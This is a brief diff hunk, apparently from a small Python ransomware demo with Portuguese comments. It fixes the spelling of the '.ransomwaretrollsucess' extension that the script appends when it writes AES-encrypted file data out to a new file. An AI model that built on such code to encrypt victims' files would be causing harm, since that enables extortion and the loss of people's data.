@@ -24,7 +24,7 @@ crypto_data = aes.encrypt(file_data)
 
 ## Salvar o arquivo criptografado
 
-new_file =  file_name + '.ransomearetrollsucess'
+new_file =  file_name + '.ransomwaretrollsucess'
 new_file = open(f'{new_file}', 'wb')
 new_file.write(crypto_data)
 new_file.close()
